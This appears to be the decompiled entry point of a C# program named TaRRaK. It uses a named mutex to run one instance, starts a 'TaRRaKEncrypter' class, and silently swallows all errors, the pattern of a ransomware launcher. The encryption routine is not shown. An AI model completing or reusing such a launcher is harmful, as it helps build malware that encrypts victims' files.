using System.Threading;

namespace TaRRaK;

internal class Program
{
	private static void Main()
	{
		try
		{
			bool createdNew;
			using Mutex mutex = new Mutex(initiallyOwned: true, "TaRRaK", out createdNew);
			if (createdNew)
			{
				new TaRRaKEncrypter().Start();
				mutex.ReleaseMutex();
			}
		}
		catch
		{
		}
	}
}
